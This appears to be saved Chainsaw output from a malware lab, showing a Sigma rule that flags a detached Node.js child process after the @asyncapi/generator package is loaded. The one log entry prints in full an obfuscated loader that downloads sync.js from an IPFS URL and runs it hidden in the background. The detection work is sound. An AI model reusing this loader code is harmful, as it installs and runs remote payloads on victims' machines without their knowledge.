@@ -1,0 +1,172 @@
+/opt/chainsaw$ ./chainsaw hunt --sigma ~/Documents/detections/Sigma/asyncapi-supply-chain-compromise/rules/ --mapping mappings/sigma-event-logs-all.yml ~/Documents/detections/Sigma/asyncapi-supply-chain-compromise/events/sysmon_20260722_014207.evtx --full
+
+ ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
+██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
+██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
+██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
+╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
+ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
+    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)
+
+[+] Loading detection rules from: /home/user/Documents/detections/Sigma/asyncapi-supply-chain-compromise/rules/
+[+] Loaded 1 detection rules
+[+] Loading forensic artefacts from: /home/user/Documents/detections/Sigma/asyncapi-supply-chain-compromise/events/sysmon_20260722_014207.evtx (extensions: .evtx, .evt)
+[+] Loaded 1 forensic artefacts (37.1 MiB)
+[+] Current Artifact: /home/user/Documents/detections/Sigma/asyncapi-supply-chain-compromise/events/sysmon_20260722_014207.evtx
+[+] Hunting [========================================] 1/1   [00:00:01]                                                                                                                                     
+[+] Group: Sigma
+┌─────────────────────┬──────────────────────────────┬───────┬──────────────────────────┬──────────┬───────────┬──────────┬────────────────────────────────┐
+│      timestamp      │          detections          │ count │  Event.System.Provider   │ Event ID │ Record ID │ Computer │           Event Data           │
+├─────────────────────┼──────────────────────────────┼───────┼──────────────────────────┼──────────┼───────────┼──────────┼────────────────────────────────┤
+│ 2026-07-22 01:46:42 │ ‣ NodeJS Suspicious Detached │ 1     │ Microsoft-Windows-Sysmon │ 1        │ 3354431   │ malz-lab │ Image: C:\Program Files\nodejs │
+│                     │ Child Process Execution      │       │                          │          │           │          │ \node.exe                      │
+│                     │                              │       │                          │          │           │          │ RuleName: '-'                  │
+│                     │                              │       │                          │          │           │          │ Description: Node.js JavaScrip │
+│                     │                              │       │                          │          │           │          │ t Runtime                      │
+│                     │                              │       │                          │          │           │          │ OriginalFileName: node.exe     │
+│                     │                              │       │                          │          │           │          │ TerminalSessionId: 1           │
+│                     │                              │       │                          │          │           │          │ ParentCommandLine: 'node -e re │
+│                     │                              │       │                          │          │           │          │ quire(''@asyncapi/generator'') │
+│                     │                              │       │                          │          │           │          │  '                             │
+│                     │                              │       │                          │          │           │          │ Product: Node.js               │
+│                     │                              │       │                          │          │           │          │ Company: Node.js               │
+│                     │                              │       │                          │          │           │          │ ParentProcessId: 4976          │
+│                     │                              │       │                          │          │           │          │ ParentUser: MALZ-LAB\malz.lab  │
+│                     │                              │       │                          │          │           │          │ LogonGuid: 6BD7F572-968E-6A5B- │
+│                     │                              │       │                          │          │           │          │ 0190-030000000000              │
+│                     │                              │       │                          │          │           │          │ Hashes: SHA1=33593B7C94331DAAA │
+│                     │                              │       │                          │          │           │          │ 3199D804FB82F1440F2D732,MD5=79 │
+│                     │                              │       │                          │          │           │          │ D107FE64FFD2B7A0C6213E3F557CA9 │
+│                     │                              │       │                          │          │           │          │ ,SHA256=C6335D08331C23D68B9F2B │
+│                     │                              │       │                          │          │           │          │ 18ADB102002D76EF150B47248E954C │
+│                     │                              │       │                          │          │           │          │ 507E0D033664,IMPHASH=6538DFB25 │
+│                     │                              │       │                          │          │           │          │ A4AF0BD0D9AAA2ACC7B075A        │
+│                     │                              │       │                          │          │           │          │ ParentProcessGuid: 6BD7F572-20 │
+│                     │                              │       │                          │          │           │          │ F1-6A60-D802-000000001B00      │
+│                     │                              │       │                          │          │           │          │ ProcessId: 10616               │
+│                     │                              │       │                          │          │           │          │ CurrentDirectory: C:\Toolz\Cod │
+│                     │                              │       │                          │          │           │          │ e\FileRead\                    │
+│                     │                              │       │                          │          │           │          │ ProcessGuid: 6BD7F572-2102-6A6 │
+│                     │                              │       │                          │          │           │          │ 0-DE02-000000001B00            │
+│                     │                              │       │                          │          │           │          │ CommandLine: 'node -e "const _ │
+│                     │                              │       │                          │          │           │          │ 0x53735b=_0x5c98;function _0x2 │
+│                     │                              │       │                          │          │           │          │ 7c0(){const _0x130544=[''19476 │
+│                     │                              │       │                          │          │           │          │ 31Zzsxeh'',''8439UkoHuX'',''40 │
+│                     │                              │       │                          │          │           │          │ 17015FknlNQ'',''statusCode'',' │
+│                     │                              │       │                          │          │           │          │ 'Library'',''44rTQbGI'',''path │
+│                     │                              │       │                          │          │           │          │ '',''platform'',''error'',''.l │
+│                     │                              │       │                          │          │           │          │ ocal'',''win32'',''6RpSpSw'',' │
+│                     │                              │       │                          │          │           │          │ '82itQEBW'',''11XoMggn'',''987 │
+│                     │                              │       │                          │          │           │          │ 728ViRWIl'',''join'',''darwin' │
+│                     │                              │       │                          │          │           │          │ ',''https'',''mkdirSync'',''Fa │
+│                     │                              │       │                          │          │           │          │ iled: '',''existsSync'',''unli │
+│                     │                              │       │                          │          │           │          │ nk'',''NodeJS'',''message'','' │
+│                     │                              │       │                          │          │           │          │ close'',''unref'',''exit'',''g │
+│                     │                              │       │                          │          │           │          │ et'',''ignore'',''4302160yaSWj │
+│                     │                              │       │                          │          │           │          │ j'',''201273LcFLWr'',''https:/ │
+│                     │                              │       │                          │          │           │          │ /ipfs.io/ipfs/QmQobZSp1wRPrpSE │
+│                     │                              │       │                          │          │           │          │ Q56qnyq7ecZh5Bg5k1fnjt4SUwwHb9 │
+│                     │                              │       │                          │          │           │          │ '',''node'',''share'',''89885O │
+│                     │                              │       │                          │          │           │          │ iMXDZ''];_0x27c0=function(){re │
+│                     │                              │       │                          │          │           │          │ turn _0x130544;};return _0x27c │
+│                     │                              │       │                          │          │           │          │ 0();}function _0x5c98(_0x1bd02 │
+│                     │                              │       │                          │          │           │          │ 6,_0x27c1a7){_0x1bd026=_0x1bd0 │
+│                     │                              │       │                          │          │           │          │ 26-0x1b2;const _0x27c038=_0x27 │
+│                     │                              │       │                          │          │           │          │ c0();let _0x5c9888=_0x27c038[_ │
+│                     │                              │       │                          │          │           │          │ 0x1bd026];return _0x5c9888;}(f │
+│                     │                              │       │                          │          │           │          │ unction(_0x395064,_0x5b8434){c │
+│                     │                              │       │                          │          │           │          │ onst _0x1f5e79=_0x5c98,_0x24b2 │
+│                     │                              │       │                          │          │           │          │ 1d=_0x395064();while(!![]){try │
+│                     │                              │       │                          │          │           │          │ {const _0x119cd3=-parseInt(_0x │
+│                     │                              │       │                          │          │           │          │ 1f5e79(0x1cb))/0x1+parseInt(_0 │
+│                     │                              │       │                          │          │           │          │ x1f5e79(0x1b9))/0x2*(-parseInt │
+│                     │                              │       │                          │          │           │          │ (_0x1f5e79(0x1d1))/0x3)+-parse │
+│                     │                              │       │                          │          │           │          │ Int(_0x1f5e79(0x1b2))/0x4*(-pa │
+│                     │                              │       │                          │          │           │          │ rseInt(_0x1f5e79(0x1cf))/0x5)+ │
+│                     │                              │       │                          │          │           │          │ parseInt(_0x1f5e79(0x1b8))/0x6 │
+│                     │                              │       │                          │          │           │          │ *(parseInt(_0x1f5e79(0x1d0))/0 │
+│                     │                              │       │                          │          │           │          │ x7)+parseInt(_0x1f5e79(0x1bb)) │
+│                     │                              │       │                          │          │           │          │ /0x8+parseInt(_0x1f5e79(0x1d2) │
+│                     │                              │       │                          │          │           │          │ )/0x9+-parseInt(_0x1f5e79(0x1c │
+│                     │                              │       │                          │          │           │          │ a))/0xa*(parseInt(_0x1f5e79(0x │
+│                     │                              │       │                          │          │           │          │ 1ba))/0xb);if(_0x119cd3===_0x5 │
+│                     │                              │       │                          │          │           │          │ b8434)break;else _0x24b21d[''p │
+│                     │                              │       │                          │          │           │          │ ush''](_0x24b21d[''shift'']()) │
+│                     │                              │       │                          │          │           │          │ ;}catch(_0x1a443c){_0x24b21d[' │
+│                     │                              │       │                          │          │           │          │ 'push''](_0x24b21d[''shift'']( │
+│                     │                              │       │                          │          │           │          │ ));}}}(_0x27c0,0x48fcf));const │
+│                     │                              │       │                          │          │           │          │  fs=require(''fs''),path=requi │
+│                     │                              │       │                          │          │           │          │ re(_0x53735b(0x1b3)),https=req │
+│                     │                              │       │                          │          │           │          │ uire(_0x53735b(0x1be)),{spawn} │
+│                     │                              │       │                          │          │           │          │ =require(''child_process''),os │
+│                     │                              │       │                          │          │           │          │ =require(''os''),FILE_URL=_0x5 │
+│                     │                              │       │                          │          │           │          │ 3735b(0x1cc),FILE_NAME=''sync. │
+│                     │                              │       │                          │          │           │          │ js'';function getTargetDirecto │
+│                     │                              │       │                          │          │           │          │ ry(){const _0x5396c6=_0x53735b │
+│                     │                              │       │                          │          │           │          │ ,_0x2d6dd6=os[''homedir'']();s │
+│                     │                              │       │                          │          │           │          │ witch(process[_0x5396c6(0x1b4) │
+│                     │                              │       │                          │          │           │          │ ]){case _0x5396c6(0x1b7):retur │
+│                     │                              │       │                          │          │           │          │ n path[_0x5396c6(0x1bc)](proce │
+│                     │                              │       │                          │          │           │          │ ss.env.LOCALAPPDATA||path[''jo │
+│                     │                              │       │                          │          │           │          │ in''](_0x2d6dd6,''AppData'','' │
+│                     │                              │       │                          │          │           │          │ Local''),_0x5396c6(0x1c3));cas │
+│                     │                              │       │                          │          │           │          │ e _0x5396c6(0x1bd):return path │
+│                     │                              │       │                          │          │           │          │ [''join''](_0x2d6dd6,_0x5396c6 │
+│                     │                              │       │                          │          │           │          │ (0x1d4),''Application Support' │
+│                     │                              │       │                          │          │           │          │ ',_0x5396c6(0x1c3));case''linu │
+│                     │                              │       │                          │          │           │          │ x'':return path[''join''](_0x2 │
+│                     │                              │       │                          │          │           │          │ d6dd6,_0x5396c6(0x1b6),_0x5396 │
+│                     │                              │       │                          │          │           │          │ c6(0x1ce),_0x5396c6(0x1c3));de │
+│                     │                              │       │                          │          │           │          │ fault:return path[_0x5396c6(0x │
+│                     │                              │       │                          │          │           │          │ 1bc)](_0x2d6dd6,''.config'','' │
+│                     │                              │       │                          │          │           │          │ node'');}}function downloadFil │
+│                     │                              │       │                          │          │           │          │ e(_0x488e65,_0x2ce98d){return  │
+│                     │                              │       │                          │          │           │          │ new Promise((_0x5383a2,_0xb62a │
+│                     │                              │       │                          │          │           │          │ 4e)=>{const _0xeb3fb7=_0x5c98, │
+│                     │                              │       │                          │          │           │          │ _0x1be83f=fs[''createWriteStre │
+│                     │                              │       │                          │          │           │          │ am''](_0x2ce98d);https[_0xeb3f │
+│                     │                              │       │                          │          │           │          │ b7(0x1c8)](_0x488e65,_0x582158 │
+│                     │                              │       │                          │          │           │          │ =>{const _0x1ad24e=_0xeb3fb7;i │
+│                     │                              │       │                          │          │           │          │ f(_0x582158[''statusCode'']!== │
+│                     │                              │       │                          │          │           │          │ 0xc8){_0xb62a4e(new Error(_0x1 │
+│                     │                              │       │                          │          │           │          │ ad24e(0x1c0)+_0x582158[_0x1ad2 │
+│                     │                              │       │                          │          │           │          │ 4e(0x1d3)]));return;}_0x582158 │
+│                     │                              │       │                          │          │           │          │ [''pipe''](_0x1be83f),_0x1be83 │
+│                     │                              │       │                          │          │           │          │ f[''on''](''finish'',()=>{cons │
+│                     │                              │       │                          │          │           │          │ t _0x5572a5=_0x1ad24e;_0x1be83 │
+│                     │                              │       │                          │          │           │          │ f[_0x5572a5(0x1c5)](_0x5383a2) │
+│                     │                              │       │                          │          │           │          │ ;});})[''on''](_0xeb3fb7(0x1b5 │
+│                     │                              │       │                          │          │           │          │ ),_0x13f079=>{const _0x257d3d= │
+│                     │                              │       │                          │          │           │          │ _0xeb3fb7;fs[_0x257d3d(0x1c2)] │
+│                     │                              │       │                          │          │           │          │ (_0x2ce98d,()=>{}),_0xb62a4e(_ │
+│                     │                              │       │                          │          │           │          │ 0x13f079);});});}async functio │
+│                     │                              │       │                          │          │           │          │ n main(){const _0x12b69a=_0x53 │
+│                     │                              │       │                          │          │           │          │ 735b;try{const _0x31ebf1=getTa │
+│                     │                              │       │                          │          │           │          │ rgetDirectory(),_0x555166=path │
+│                     │                              │       │                          │          │           │          │ [''join''](_0x31ebf1,FILE_NAME │
+│                     │                              │       │                          │          │           │          │ );!fs[_0x12b69a(0x1c1)](_0x31e │
+│                     │                              │       │                          │          │           │          │ bf1)&&fs[_0x12b69a(0x1bf)](_0x │
+│                     │                              │       │                          │          │           │          │ 31ebf1,{''recursive'':!![]});a │
+│                     │                              │       │                          │          │           │          │ wait downloadFile(FILE_URL,_0x │
+│                     │                              │       │                          │          │           │          │ 555166);const _0xa7770=spawn(_ │
+│                     │                              │       │                          │          │           │          │ 0x12b69a(0x1cd),[_0x555166],{' │
+│                     │                              │       │                          │          │           │          │ 'detached'':!![],''stdio'':_0x │
+│                     │                              │       │                          │          │           │          │ 12b69a(0x1c9),''windowsHide'': │
+│                     │                              │       │                          │          │           │          │ !![]});_0xa7770[_0x12b69a(0x1c │
+│                     │                              │       │                          │          │           │          │ 6)](),process[_0x12b69a(0x1c7) │
+│                     │                              │       │                          │          │           │          │ ](0x0);}catch(_0x5e632d){conso │
+│                     │                              │       │                          │          │           │          │ le[_0x12b69a(0x1b5)](_0x5e632d │
+│                     │                              │       │                          │          │           │          │ [_0x12b69a(0x1c4)]),process[_0 │
+│                     │                              │       │                          │          │           │          │ x12b69a(0x1c7)](0x1);}}main(); │
+│                     │                              │       │                          │          │           │          │ "'                             │
+│                     │                              │       │                          │          │           │          │ FileVersion: 24.17.0           │
+│                     │                              │       │                          │          │           │          │ User: MALZ-LAB\malz.lab        │
+│                     │                              │       │                          │          │           │          │ LogonId: '0x39001'             │
+│                     │                              │       │                          │          │           │          │ IntegrityLevel: High           │
+│                     │                              │       │                          │          │           │          │ ParentImage: C:\Program Files\ │
+│                     │                              │       │                          │          │           │          │ nodejs\node.exe                │
+│                     │                              │       │                          │          │           │          │ UtcTime: 2026-07-22 01:46:42.0 │
+│                     │                              │       │                          │          │           │          │ 54                             │
+└─────────────────────┴──────────────────────────────┴───────┴──────────────────────────┴──────────┴───────────┴──────────┴────────────────────────────────┘
+
+[+] 1 Detections found on 1 documents
